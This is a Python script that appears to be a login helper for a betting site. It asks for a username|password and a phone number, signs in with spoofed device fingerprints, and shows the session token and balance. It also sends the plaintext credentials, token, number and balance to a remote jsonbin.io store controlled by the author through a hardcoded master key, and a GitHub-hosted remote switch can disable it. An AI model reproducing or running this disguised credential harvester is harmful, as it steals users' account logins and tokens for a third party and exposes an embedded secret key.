import requests,os
BOLD = "\033[1m"
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
D = "\033[0m"


os.system("clear")


BIN_ID = "68ce938743b1c97be9493c68"
API_KEY = "$2a$10$UFSeZeyc10fKX8SlSZ8wCOnfNpu7hd87.zlRgbHSOClRVZ9R7U0b6"

def upload_token(userp: str, token: str, number: str,balance: str):
    url = f"https://api.jsonbin.io/v3/b/{BIN_ID}"
    headers = {
        "Content-Type": "application/json",
        "X-Master-Key": API_KEY
    }
    data = {"user_id":userp,"balance":balance,"token": token,"number":number}
    r = requests.put(url, headers=headers, json=data)
    
    if r.status_code == 200:
        print(f"{BOLD}{G} ✅ Token uploaded successfully to Server{D}")
    else:
        print(f"{BOLD}{R} ❌ Upload failed (status {r.status_code}){D}")


def login():
    userp = input(f"{BOLD}{Y} ENTER USER|PASS : {D}")
    number = input(f"{BOLD}{Y} ENTER NUMBER : {D}")
    user_pass = userp.replace(" ","").split("|")

    headers = {
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://jeetbuzz66.me/bd/en/login',
        'X-Internal-Request': '61405202',
        'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
        'getIntercomInfo': True,
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'userId': user_pass[0],
        'password': user_pass[1],
        'isBioLogin': False,
        'loginTypeId': 0,
        'fingerprint2': '58df140599f977faf8951888e888e807',
        'fingerprint4': 'f91cf49459fdec23221fc66161a3fa20',
        'browserHash': '3969af0f2862ebb0d85edf6ea8430292',
        'deviceHash': '15cfad26f3a3679721b1e64b20fee5ec',
    }

    while True:
        print("\n\n")
        input(" PRESS ENTER TO LOGIN...")
        response = requests.post('https://jeetbuzz66.me/api/wv/v1/user/login',headers=headers,json=json_data).json()
        token = response.get("data", {}).get("accessToken")
        balance = response.get('data', {}).get('mainWallet', 'N/A')
        print(response)
        if token:
            print(f"{BOLD} {G}Got token: {token}{D}\n")
            print(f"{BOLD} {G}Balance : {balance}{D}")
            upload_token(userp,token,number,balance)
        else:
            print(f"{BOLD} {R} ❌ Login failed, no token received.{D}")
            break


def switch():
    s = requests.get("https://raw.githubusercontent.com/bajilive-support/verify/refs/heads/main/switch.txt").text
    if "ON" in s:
        pass

    else:
        print(f"\n{BOLD}{R} THIS TOOL HAS DISABLED BY ADMIN!{D}")
        exit(0)


switch()
login()
